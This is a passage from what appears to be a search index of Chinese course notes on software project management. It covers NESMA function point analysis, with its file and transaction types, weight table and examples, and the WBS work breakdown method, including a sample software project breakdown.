method","title":"\u76ee\u5f55"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/3.NESMA%E5%8A%9F%E8%83%BD%E7%82%B9%E4%BC%B0%E8%AE%A1%E6%96%B9%E6%B3%95/#1","text":"\u6700\u8fd1\u5728\u300a\u8f6f\u4ef6\u534f\u540c\u8bbe\u8ba1\u300b\u8bfe\u7a0b\u4e2d\u5b66\u4e60\u4e86\u529f\u80fd\u70b9\u4f30\u8ba1\u65b9\u6cd5\uff0c\u5728\u6b64\u8fdb\u884c\u603b\u7ed3\u3002","title":"1. \u80cc\u666f"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/3.NESMA%E5%8A%9F%E8%83%BD%E7%82%B9%E4%BC%B0%E8%AE%A1%E6%96%B9%E6%B3%95/#2","text":"\u529f\u80fd\u70b9\u5206\u6790\u6cd5 FPA(Function Point Analysis) \u662f\u7531 IBM \u7684 \u5de5\u7a0b\u5e08 Alan JAlbrecht \u4e8e 2O\u4e16\u7eaa7O\u5e74\u4ee3\u672b\u63d0\u51fa\u7684 \uff0c\u662f\u4e00\u79cd\u4e0e\u7a0b\u5e8f\u8bed\u8a00\u65e0\u5173\uff0c\u80fd\u591f\u6709\u6548\u8861\u91cf\u8f6f\u4ef6\u89c4\u6a21\u7684\u65b9\u6cd5\u3002\u8377\u5170\u8f6f\u4ef6\u5ea6\u91cf\u534f\u4f1a ( Netherland Software Measurement Asociation )\u63a8\u51fa\u4e86 NESMA \u529f\u80fd\u70b9\uff0c\u90fd\u662f Albrech \u529f\u80fd\u70b9\u5206\u6790\u7406\u8bba\u7684\u53d1\u5c55\u548c\u7ec6\u5316\u3002","title":"2. \u6982\u8ff0"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/3.NESMA%E5%8A%9F%E8%83%BD%E7%82%B9%E4%BC%B0%E8%AE%A1%E6%96%B9%E6%B3%95/#3","text":"\u5728NESMA\u7684\u5b98\u65b9\u6587\u6863\u4e2d\u5bf9 NESMA \u529f\u80fd\u70b9\u4f30\u8ba1\u65b9\u6cd5\u8fdb\u884c\u4e86\u5b9a\u4e49\u3002 Nesma recognizes three function point analysis methods: Detailed FPA High Level FPA (also called Estimated FPA) Indicative FPA All these three methods are a self-contained Functional Size Measurement (FSM) method on their own. The high level FPA method and the indicative FPA method do not require detailed user requirements, while the functional size determined using these methods is very close to the functional size determined using the detailed FPA method. That\u2019s why these two methods are very suited to be applied early in de software development life cycle or in case the functional size needs to be determined fast. This document discusses these three methods, their accuracy and applicability.","title":"3. \u65b9\u6cd5\u5b9a\u4e49"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/3.NESMA%E5%8A%9F%E8%83%BD%E7%82%B9%E4%BC%B0%E8%AE%A1%E6%96%B9%E6%B3%95/#31-detailed-fpa-method","text":"This is the usual function point analysis method and is performed as follows: determine all functions of all function types (ILF, EIF, EI, EO, EQ) rate the complexity of every function (Low, Average, High) calculate the total number of function points","title":"3.1. Detailed FPA method"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/3.NESMA%E5%8A%9F%E8%83%BD%E7%82%B9%E4%BC%B0%E8%AE%A1%E6%96%B9%E6%B3%95/#32-high-level-fpa-method","text":"The high level function point analysis method is performed as follows: determine all functions of all function types (ILF, EIF, EI, EO, EQ) rate the complexity of every data function (ILF, EIF) as Low, and of every transactional function (EI, EO, EQ) as Average calculate the total number of function points So, the only difference with the detailed function point analysis method is that the complexity is not determined per individual function, but by default.","title":"3.2. High Level FPA method"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/3.NESMA%E5%8A%9F%E8%83%BD%E7%82%B9%E4%BC%B0%E8%AE%A1%E6%96%B9%E6%B3%95/#33-indicative-fpa-method","text":"The indicative function point analysis method is performed as follows: Determine all data functions (ILF and EIF) Calculate the number of function points as follows: functional size (fp) = 35 x number of ILFs + 15 x number of EIFs So the functional size is based solely on the logical files (ILFs and EIFs). The indicative function point analysis method is based on the assumption that there will be about three EIs (to add, change, and delete information in the ILF), two EOs, and one EQ on average for every ILF, and about one EO and one EQ for every EIF. \u8bba\u6587\u300a\u57fa\u4e8eNESMA\u529f\u80fd\u70b9\u5206\u6790\u65b9\u6cd5\u300b\u4e2d\u5bf9 ILF \u548c EIF \u4e5f\u8fdb\u884c\u4e86\u5b9a\u4e49\u3002","title":"3.3. Indicative FPA method"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/3.NESMA%E5%8A%9F%E8%83%BD%E7%82%B9%E4%BC%B0%E8%AE%A1%E6%96%B9%E6%B3%95/#4","text":"","title":"4. \u6982\u5ff5\u5b9a\u4e49"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/3.NESMA%E5%8A%9F%E8%83%BD%E7%82%B9%E4%BC%B0%E8%AE%A1%E6%96%B9%E6%B3%95/#41-eif-external-interface-file","text":"\u88ab\u4e00\u5e94\u7528\u7a0b\u5e8f\u5f15\u7528\u4f46\u5728\u53e6\u4e00\u5e94\u7528\u7a0b\u5e8f\u8fb9\u754c\u5185\u88ab\u7ef4\u62a4\u7684\uff0c\u7528\u6237\u53ef\u8bc6\u522b\u7684\u903b\u8f91\u76f8\u5173\u6570\u636e\u7ec4\u6216\u63a7\u5236\u4fe1\u606f\uff0c\u5176\u4e3b\u8981\u76ee\u7684\u662f\u4fdd\u5b58\u7531\u88ab\u8ba1\u6570\u7684\u5e94\u7528\u7a0b\u5e8f\u8fb9\u754c\u5185\u7684\u4e00\u4e2a\u6216\u591a\u4e2a\u57fa\u672c\u5904\u7406\u6240\u5f15\u7528\u7684\u6570\u636e\u3002","title":"4.1. \u5916\u90e8\u63a5\u53e3\u6587\u4ef6 (EIF External Interface File)"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/3.NESMA%E5%8A%9F%E8%83%BD%E7%82%B9%E4%BC%B0%E8%AE%A1%E6%96%B9%E6%B3%95/#42-ilf-internal-logical-file","text":"\u5728\u5e94\u7528\u7a0b\u5e8f\u8fb9\u754c\u5185\u7ef4\u62a4\u7684\u7528\u6237\u53ef\u8bc6\u522b\u7684\u903b\u8f91\u76f8\u5173\u6570\u636e\u7ec4\u6216\u63a7\u5236\u4fe1\u606f\u3002\u5176\u4e3b\u8981\u76ee\u7684\u662f\u4fdd\u5b58\u7531\u88ab\u8ba1\u6570\u7684\u5e94\u7528\u7a0b\u5e8f\u7684\u4e00\u4e2a\u6216\u591a\u4e2a\u57fa\u672c\u5904\u7406\u6240\u7ef4\u62a4\u7684\u6570\u636e\u3002 NESMA \u5b98\u65b9\u6587\u6863\u4e2d\u5bf9 ILF \u7684\u5b9a\u4e49\u3002 The definition of an ILF is: An internal logical file is a logical group of permanent data seen from the perspective of the user that meets each of the following criteria: It is used by the application to be counted It is maintained by the application to be counted The aforementioned entities meet the listed criteria: they are both used and maintained by the information system to be counted. However, the phrase, \"from the perspective of the user\" is crucial. The guideline states the following on this subject: \"... a group of data that an experienced user considers as a significant and useful unit or object. An equivalent to this kind of logical group of data is an object type in data modeling.\" For users, the four different types of taxes are also four different things. Taxes and the accompanying regulations are indeed mutually substantively totally different. The designer of the above model has wanted to connect to the different taxes and opted to accommodate four types of payments in four separate tables; these are largely similar in structure. Logically, however, they all concern one object type PAYMENT, of which one of the data element types could be: TaxType. For the valuation of the logical file the additional data element type will be counted and no additional record types are distinguished. In a situation like this it is recommended to adjust the functional design in order to avoid discrepancy between the count and the design.","title":"4.2. \u5185\u90e8\u903b\u8f91\u6587\u4ef6 (ILF Internal Logical File)"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/3.NESMA%E5%8A%9F%E8%83%BD%E7%82%B9%E4%BC%B0%E8%AE%A1%E6%96%B9%E6%B3%95/#43-eq-external-inquiry","text":"\u53d1\u9001\u6570\u636e\u6216\u63a7\u5236\u4fe1\u606f\u5230\u5e94\u7528\u7a0b\u5e8f\u8fb9\u754c\u5916\u7684\u4e00\u4e2a\u57fa\u672c\u5904\u7406\uff0c\u5176\u4e3b\u8981\u76ee\u7684\u662f\u901a\u8fc7\u68c0\u7d22\u6765\u81ea\u5185\u90e8\u903b\u8f91\u6587\u4ef6\u6216\u5916\u90e8\u63a5\u53e3\u6587\u4ef6\u7684\u6570\u636e\u6216\u63a7\u5236\u4fe1\u606f\uff0c\u5411\u7528\u6237\u63d0\u4f9b\u4fe1\u606f\u3002\u5904\u7406\u903b\u8f91\u65e2\u4e0d\u5305\u542b\u6570\u5b66\u516c\u5f0f\u6216\u8ba1\u7b97\uff0c\u4e5f\u4e0d\u521b\u5efa\u65b0\u7684\u6570\u636e\u3002\u5904\u7406\u671f\u95f4\u4e0d\u7ef4\u62a4\u5185\u90e8\u903b\u8f91\u6587\u4ef6\uff0c\u4e5f\u4e0d\u6539\u53d8\u7cfb\u7edf\u884c\u4e3a\u3002","title":"4.3. \u5916\u90e8\u67e5\u8be2(EQ External Inquiry)"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/3.NESMA%E5%8A%9F%E8%83%BD%E7%82%B9%E4%BC%B0%E8%AE%A1%E6%96%B9%E6%B3%95/#44-ei-extemal-input","text":"\u6570\u636e\u6216\u63a7\u5236\u4fe1\u606f\u7531\u5916\u5411\u5185\u7a7f\u8d8a\u5e94\u7528\u7a0b\u5e8f\u8fb9\u754c\u7684\u4e00\u4e2a\u57fa\u672c\u5904\u7406\u8fc7\u7a0b\uff0c\u5176\u4e3b\u8981\u76ee\u7684\u662f\u7ef4\u62a4\u4e00\u4e2a\u6216\u591a\u4e2a\u5185\u90e8\u903b\u8f91\u6587\u4ef6\u548c/\u6216\u6539\u53d8\u7cfb\u7edf\u884c\u4e3a\u3002","title":"4.4. \u5916\u90e8\u8f93\u5165(EI Extemal Input)"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/3.NESMA%E5%8A%9F%E8%83%BD%E7%82%B9%E4%BC%B0%E8%AE%A1%E6%96%B9%E6%B3%95/#45-eo-external-output","text":"\u53d1\u9001\u6570\u636e\u6216\u63a7\u5236\u4fe1\u606f\u5230\u5e94\u7528\u7a0b\u5e8f\u8fb9\u754c\u5916\u7684\u4e00\u4e2a\u57fa\u672c\u5904\u7406\uff0c\u5176\u4e3b\u8981\u76ee\u7684\u662f\u901a\u8fc7\u68c0\u7d22\u6570\u636e\u6216\u63a7\u5236\u4fe1\u606f\uff0c\u6b64\u5916\u8fd8\u901a\u8fc7\u5904\u7406\u903b\u8f91\u6765\u5411\u7528\u6237\u63d0\u4f9b\u4fe1\u606f\uff0c\u5176\u5904\u7406\u903b\u8f91\u5fc5\u987b\u5305\u542b\u81f3\u5c11\u4e00\u4e2a\u6570\u5b66\u516c\u5f0f\u6216\u8ba1\u7b97\uff0c\u6216\u521b\u5efa\u6d3e\u751f\u7684\u6570\u636e\u3002\u4e00\u4e2a\u5916\u90e8\u8f93\u51fa\u4e5f\u53ef\u4ee5\u7ef4\u62a4\u4e00\u4e2a\u6216\u591a\u4e2a\u5185\u90e8\u903b\u8f91\u6587\u4ef6\uff0c\u548c/\u6216\u6539\u53d8\u7cfb\u7edf\u884c\u4e3a\u3002 \u5176\u4e2d : \u6570 \u636e \u7c7b \u578b : ILF\u3001 EIF \u4e8b\u52a1\u7c7b\u578b : El\u3001EO\u3001EQ","title":"4.5. \u5916\u90e8\u8f93\u51fa (EO External Output)"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/3.NESMA%E5%8A%9F%E8%83%BD%E7%82%B9%E4%BC%B0%E8%AE%A1%E6%96%B9%E6%B3%95/#5","text":"Complexity ILF EIF EI EO EQ Low 7 5 3 4 3 Average 10 7 4 5 4 High 15 10 6 7 5","title":"5. \u529f\u80fd\u70b9\u6570\u53c2\u8003\u503c"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/3.NESMA%E5%8A%9F%E8%83%BD%E7%82%B9%E4%BC%B0%E8%AE%A1%E6%96%B9%E6%B3%95/#6","text":"","title":"6. \u4e3e\u4f8b"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/3.NESMA%E5%8A%9F%E8%83%BD%E7%82%B9%E4%BC%B0%E8%AE%A1%E6%96%B9%E6%B3%95/#63-indicative-fpa-method","text":"For an indicative function point analysis just information about the data functions is needed. User requirements: user wants to maintain Customer data and Product data, and to reference Supplier data This (rough) specification is enough for an indicative function point analysis: ILF: Customer and Product EIF: Supplier","title":"6.3. Indicative FPA method"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/3.NESMA%E5%8A%9F%E8%83%BD%E7%82%B9%E4%BC%B0%E8%AE%A1%E6%96%B9%E6%B3%95/#62-high-level-fpa-method","text":"To perform a high level function point analysis also information about the transactional functions is needed, so more detailed user requirements are necessary. User requirements: user wants to add, change, delete Customer data, wants to inquire on Customer, and also requires four different reports on Customer with calculated data user wants to add, change, delete Product data, wants to inquire on Product, and also requires a report on Product with calculated data user wants to inquire on Supplier using supplier number, and also requires a report on Supplier with totaling results This more detailed specification of functions, and therefore enables a the user requirements contains also the transactional high level function point analysis:","title":"6.2. High Level FPA method"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/3.NESMA%E5%8A%9F%E8%83%BD%E7%82%B9%E4%BC%B0%E8%AE%A1%E6%96%B9%E6%B3%95/#61-detailed-fpa-method","text":"To carry out a detailed function point analysis, one does not only need the number of functions of each function type (EI, EO, EQ, ILF, EIF), but one also needs to determine the functional complexity of each individual function (Low, Average, High). In a detailed FPA, the functional complexity of a (data or transactional) function is determined, based on the number of DETs, RETs and File Types Referenced that are relevant to this function. That's why the user requirements (as they were stated above when the high level function point analysis was discussed) need to be analyzed in more detail: which data elements (DETs) and logical files (File Types Referenced) are used by a transactional function (EI, EO, EQ), and which logical data groups (RETs) and data elements (DETs) a data function (ILF, EIF) consists of. This detailed analysis of the user requirements could result in the following (detailed) function point analysis: \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"6.1. Detailed FPA method"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/4.WBS%E5%B7%A5%E4%BD%9C%E7%BB%93%E6%9E%84%E5%88%86%E8%A7%A3%E6%96%B9%E6%B3%95/","text":"WBS\u5de5\u4f5c\u7ed3\u6784\u5206\u89e3\u65b9\u6cd5 # \u76ee\u5f55 # WBS\u5de5\u4f5c\u7ed3\u6784\u5206\u89e3\u65b9\u6cd5 \u76ee\u5f55 1. \u80cc\u666f 2. \u5b9a\u4e49 3. \u65b9\u6cd5 3.1. Practice Standard for Work Breakdown Structures 3.2. PREPARING A WBS 4. \u793a\u4f8b 5. \u5b9e\u64cd 1. \u80cc\u666f # \u6700\u8fd1\u5728\u300a\u8f6f\u4ef6\u534f\u540c\u8bbe\u8ba1\u300b\u8bfe\u7a0b\u4e2d\u5b66\u4e60\u4e86 WBS(Work Breakdown Structure) \u5de5\u4f5c\u7ed3\u6784\u5206\u89e3\u65b9\u6cd5\uff0c\u5728\u6b64\u8fdb\u884c\u603b\u7ed3\u3002 2. \u5b9a\u4e49 # WBS\uff1a\u5de5\u4f5c\u5206\u89e3\u7ed3\u6784\uff08Work Breakdown Structure\uff09\uff0c \u521b\u5efaWBS\u662f\u628a\u9879\u76ee\u5de5\u4f5c\u6309\u9636\u6bb5\u53ef\u4ea4\u4ed8\u6210\u679c\u5206\u89e3\u6210\u8f83\u5c0f\u7684\uff0c\u66f4\u6613\u4e8e\u7ba1\u7406\u7684\u7ec4\u6210\u90e8\u5206\u7684\u8fc7\u7a0b\u3002 WBS\u662f\u9879\u76ee\u7ba1\u7406\u91cd\u8981\u7684\u4e13\u4e1a\u672f\u8bed\u4e4b\u4e00\u3002WBS\u7684\u57fa\u672c\u5b9a\u4e49 \uff1a\u4ee5\u53ef\u4ea4\u4ed8\u6210\u679c\u4e3a\u5bfc\u5411\u5bf9\u9879\u76ee\u8981\u7d20\u8fdb\u884c\u7684\u5206\u7ec4\uff0c\u5b83\u5f52\u7eb3\u548c\u5b9a\u4e49\u4e86\u9879\u76ee\u7684\u6574\u4e2a\u5de5\u4f5c\u8303\u56f4\u6bcf\u4e0b\u964d\u4e00\u5c42\u4ee3\u8868\u5bf9\u9879\u76ee\u5de5\u4f5c\u7684\u66f4\u8be6\u7ec6\u5b9a\u4e49\u3002\u65e0\u8bba\u5728\u9879\u76ee\u7ba1\u7406\u5b9e\u8df5\u4e2d\uff0c\u8fd8\u662f\u5728PMP\uff0cIPMP\u8003\u8bd5\u4e2d\uff0c\u5de5\u4f5c\u5206\u89e3\u7ed3\u6784\uff08WBS\uff09\u90fd\u662f\u6700\u91cd\u8981\u7684\u5185\u5bb9\u4e4b\u4e00\u3002WBS\u603b\u662f\u5904\u4e8e\u8ba1\u5212\u8fc7\u7a0b\u7684\u4e2d\u5fc3\uff0c\u4e5f\u662f\u5236\u5b9a\u8fdb\u5ea6\u8ba1\u5212\u3001\u8d44\u6e90\u9700\u6c42\u3001\u6210\u672c\u9884\u7b97\u3001\u98ce\u9669\u7ba1\u7406\u8ba1\u5212\u548c\u91c7\u8d2d\u8ba1\u5212\u7b49\u7684\u91cd\u8981\u57fa\u7840\u3002WBS\u540c\u65f6\u4e5f\u662f\u63a7\u5236\u9879\u76ee\u53d8\u66f4\u7684\u91cd\u8981\u57fa\u7840\u3002\u9879\u76ee\u8303\u56f4\u662f\u7531WBS\u5b9a\u4e49\u7684\uff0c\u6240\u4ee5WBS\u4e5f\u662f\u4e00\u4e2a\u9879\u76ee\u7684\u7efc\u5408\u5de5\u5177\u3002 3. \u65b9\u6cd5 # 3.1. Practice Standard for Work Breakdown Structures # \u5982\u4f55\u521b\u5efaWBS\uff0c Project management Insitute \u51fa\u7248\u7684 \u300aPractice Standard for Work Breakdown Structures\u300b \u4e2d\u5bf9WBS\u505a\u4e86\u8be6\u7ec6\u7684\u63cf\u8ff0\u3002 \u7f51\u76d8\u94fe\u63a5\uff1a https://pan.baidu.com/s/1PgecXzFi-6fMjaS0aBzeHw \u5bc6\u7801: fehk The Work Breakdown Structure (WBS) can be created new, or it can reuse com- ponents from other WBSs. When reusing existing components, WBS elements may be drawn from previous similar projects or from standard project templates that the organization has determined support accepted best practices. The following sections in this chapter are presented as guides for use during the development of a WBS, and contain a number of topics for consideration: 4.2 contains Guidelines for Preparation 4.3 contains Basic Assumptions or Factors 4.4 contains Measurement Considerations 4.5 includes Project Challenges for Consideration 4.6 aids in determining the Appropriate Level of Detail 4.7 discusses WBS Life-Cycle Considerations 4.8 addresses Risk Assessment 4.9 contains guidance for use when considering Resource Planning. Some of the sections can be used as checklists for the development and refine- ment of the WBS. 3.2. PREPARING A WBS # The WBS evolves through an iterative consideration of the project\u2019s purpose and objectives, functional/performance design criteria, project scope, technical performance requirements, and other technical attributes. A high-level WBS can often be developed early in the conceptual stage of the project. Once the project is defined and specifications are prepared, a more detailed WBS can be developed. The WBS can assist the project manager and stakeholders in developing a clear vision of the end product(s) of the project and of the overall process by which it will be created. With this in mind, the following should stimulate thought when developing a WBS to manage the project: Think through the entire project. (Look at dividing high-level deliverables.) Think deliverables. (What is to be provided/what is required?) Think with the end in mind. (How will this component contribute to the finished deliverable?) Think through the production of the deliverables. (What methods? What special processes? What quality requirements? What inspections?) Have you formulated a vision of the final product in your mind? What are its constituent parts? How do the pieces work together? What needs to be done? These thoughts and questions are intended to help the project manager develop a clear statement of what the product of the project is\u2014and to help answer the question, \u201cHow does one eat an elephant?\u201d Answer: \u201cOne bite at a time!\u201d The WBS is the technique for dividing \u201cthe elephant\u201d into bite-sized pieces. The following steps describe the general process for developing a WBS: Step 1 : Identify the final product(s) of the project\u2014what must be delivered to achieve project success. A thorough review of high-level project scope documents (inputs such as statement of work [SOW], technical requirements documents, and so on) is recommended to ensure consistency between the WBS and the project requirements. Step 2 : Define the product\u2019s major deliverables, which are often predecessor deliverables necessary for the project, but that in themselves do not satisfy a business need (e.g., a design specification). Step 3 : Decompose major deliverables to a level of detail appropriate for management and integrated control. These WBS elements normally tie to clear and discrete identification of stand-alone deliverable products. Step 4 : Review and refine the WBS until project stakeholders agree that project planning can be successfully completed and that execution and control will successfully produce the desired outcomes. 4. \u793a\u4f8b # SOFTWARE IMPLEMENTATION PROJECT WBS 1.0 Project Management 1.1 Planning 1.1.1 Develop Project Charter 1.1.2 Define Scope 1.1.3 Develop Resource Plan 1.1.4 Develop Communication Plan 1.1.5 Develop Risk Plan 1.1.6 Develop Change Control Plan 1.1.7 Develop Quality Plan 1.1.8 Develop Purchase Plan 1.1.9 Develop Cost Plan 1.1.10 Develop Organization Plan 1.1.11 Develop Project Schedule 1.2 Meetings 1.2.1 Conduct Kickoff Meeting 1.2.2 Weekly Status Meeting 1.2.3 Monthly Tactical Meeting 1.2.4 Project Closing Meeting 1.3 Administration 1.3.1 Standards 1.3.1.1 Document Performance Standards 1.3.1.2 Document Reporting Standards 1.3.1.3 Document Naming Conventions 1.3.1.4 Document Housekeeping Standards 1.3.2 Program Office 1.3.2.1 Develop Program Office Charter 1.3.2.2 Assign Program Office Resources 2.0 Product Requirements 2.1 Software Requirements 2.1.1 Create Draft Software Requirements 2.1.2 Review Draft Software Requirements 2.1.3 Update Draft Software Requirements 2.1.4 Review Final Software Requirements 2.1.5 Software Requirements Approved 2.2 User Documentation 2.2.1 Create Draft User Documentation 2.2.2 Review Draft User Documentation 2.2.3 Update Draft User Documentation 2.2.4 Review Final User Documentation 2.2.5 User Documentation Approved 2.3 Training Program Materials 2.3.1 Create Initial Training Requirements 2.3.2 Review & Approve Training Requirements 2.3.3 Create Initial Training Materials 2.3.4 Review & Approve Training Materials 2.3.5 Conduct Trial Course Delivery 2.3.6 Update and Finalize Training Materials 2.4 Hardware 2.4.1 Create Draft Hardware Requirements 2.4.2 Review Draft Hardware Requirements 2.4.3 Hardware Requirements Approved 2.5 Implementation & Future Support 3.0 Detail Software Design 3.1 Create Initial Software Design 3.2 Review Initial Software Design 3.3 Update Initial Software Design 3.4 Review Final Software Design 3.5 Software Design Approved 4.0 System Construction 4.1 Configure Software 4.2 Customize User Documentation 4.3 Customize Training Program Materials 4.4 Install Hardware 4.5 Implementation & Future Support 5. \u5b9e\u64cd # # \u7ba1\u7406\u4fe1\u606f\u7cfb\u7edf ## \u521d\u59cb\u9636\u6bb5 ### \u9879\u76ee\u8ba1\u5212 #### \u5236\u5b9a\u9879\u76ee\u7ae0\u7a0b #### \u5236\u5b9a\u9879\u76ee\u8ba1\u5212 #### \u5236\u5b9a\u8d28\u91cf\u8ba1\u5212 ### \u9700\u6c42\u5206\u6790 #### \u9700\u6c42\u5efa\u6a21 #### \u9700\u6c42\u590d\u6838 #### \u7f16\u5199\u9700\u6c42\u89c4\u683c\u8bf4\u660e\u4e66 #### \u9700\u6c42\u68c0\u67e5 ## \u7ec6\u5316\u9636\u6bb5 ### \u6982\u8981\u8bbe\u8ba1 #### \u529f\u80fd\u6a21\u5757\u8bbe\u8ba1 #### \u6570\u636e\u5b58\u50a8\u8bbe\u8ba1 #### \u7528\u6237\u754c\u9762\u8bbe\u8ba1 #### \u7f16\u5199\u6982\u8981\u8bbe\u8ba1\u8bf4\u660e\u4e66 #### \u6982\u8981\u8bbe\u8ba1\u590d\u6838 ### \u8be6\u7ec6\u8bbe\u8ba1 #### \u5904\u7406\u903b\u8f91\u8bbe\u8ba1 #### \u63a5\u53e3\u8bbe\u8ba1 #### \u9875\u9762\u4e0e\u540e\u53f0\u8bbe\u8ba1 #### \u7f16\u5199\u8be6\u7ec6\u8bbe\u8ba1\u8bf4\u660e\u4e66 #### \u8be6\u7ec6\u8bbe\u8ba1\u590d\u6838 ### \u5236\u5b9a\u6d4b\u8bd5\u8ba1\u5212 #### \u8bbe\u8ba1\u6d4b\u8bd5\u7528\u4f8b #### \u7f16\u5199\u6d4b\u8bd5\u8ba1\u5212\u8bf4\u660e\u4e66 ## \u6784\u9020\u9636\u6bb5 ### \u7f16\u7801\u5b9e\u73b0 #### \u524d\u7aef\u7f16\u7801\u5b9e\u73b0 #### \u540e\u7aef\u7f16\u7801\u5b9e\u73b0 ### \u8f6f\u4ef6\u6d4b\u8bd5 #### \u5355\u5143\u6d4b\u8bd5 #### \u96c6\u6210\u6d4b\u8bd5 #### \u7cfb\u7edf\u6d4b\u8bd5 ## \u4ea4\u4ed8\u9636\u6bb5 ### \u4e0a\u7ebf\u4ea4\u4ed8 #### \u6700\u7ec8\u68c0\u67e5 #### \u4e0a\u7ebf\u90e8\u7f72 #### \u9879\u76ee\u9a8c\u6536 #### \u9879\u76ee\u8bd5\u8fd0\u884c #### \u9879\u76ee\u603b\u7ed3 \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"4.WBS\u5de5\u4f5c\u7ed3\u6784\u5206\u89e3\u65b9\u6cd5"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/4.WBS%E5%B7%A5%E4%BD%9C%E7%BB%93%E6%9E%84%E5%88%86%E8%A7%A3%E6%96%B9%E6%B3%95/#wbs","text":"","title":"WBS\u5de5\u4f5c\u7ed3\u6784\u5206\u89e3\u65b9\u6cd5"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/4.WBS%E5%B7%A5%E4%BD%9C%E7%BB%93%E6%9E%84%E5%88%86%E8%A7%A3%E6%96%B9%E6%B3%95/#_1","text":"WBS\u5de5\u4f5c\u7ed3\u6784\u5206\u89e3\u65b9\u6cd5 \u76ee\u5f55 1. \u80cc\u666f 2. \u5b9a\u4e49 3. \u65b9\u6cd5 3.1. Practice Standard for Work Breakdown Structures 3.2. PREPARING A WBS 4. \u793a\u4f8b 5. \u5b9e\u64cd","title":"\u76ee\u5f55"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/4.WBS%E5%B7%A5%E4%BD%9C%E7%BB%93%E6%9E%84%E5%88%86%E8%A7%A3%E6%96%B9%E6%B3%95/#1","text":"\u6700\u8fd1\u5728\u300a\u8f6f\u4ef6\u534f\u540c\u8bbe\u8ba1\u300b\u8bfe\u7a0b\u4e2d\u5b66\u4e60\u4e86 WBS(Work Breakdown Structure) 